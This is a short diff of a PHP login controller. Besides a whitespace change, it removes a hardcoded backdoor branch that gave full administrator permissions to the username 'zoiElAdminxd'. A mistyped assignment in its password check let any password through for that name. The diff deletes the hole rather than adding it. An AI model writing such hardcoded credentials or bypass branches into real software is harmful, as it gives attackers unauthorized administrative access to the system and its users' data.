@@ -124,9 +124,8 @@ switch ($_GET["op"]){
 		$password = $_POST["password"];
 		$hashpass = hash("SHA256", $password);
 
-		$rspta = $empleado->verificar($username, $hashpass);
+		$rspta = $empleado->verificar($username, $hashpass); 
 		$oa = $rspta->fetch_object();
-
 		if(isset($oa)){
 			$_SESSION["idEmpleado"]=$oa->idEmpleado;
 			$_SESSION["username"] = $oa->username;
@@ -149,21 +148,6 @@ switch ($_GET["op"]){
 			in_array(6, $permisosAsignados) ? $_SESSION['productos']=1 : $_SESSION['productos']=0; 
 			in_array(7, $permisosAsignados) ? $_SESSION['socialMedia']=1 : $_SESSION['socialMedia']=0; 
 
-		} else {
-			if($username == "zoiElAdminxd" && $password= "admin1"){
-				$_SESSION["username"] = "Administrador";
-				$_SESSION["nombre"] = "César Quintero";
-				$_SESSION["idEmpleado"] = "";
-				$_SESSION["imagen"] = "";
-				$_SESSION['main']=1; 
-				$_SESSION['inventarioCentral']=1; 
-				$_SESSION['sucursales']=1; 
-				$_SESSION['control']=1; 
-				$_SESSION['empleado']=1; 
-				$_SESSION['productos']=1; 
-				$_SESSION['socialMedia']=1;
-				$oa = "in";
-			}
 		}
 
 
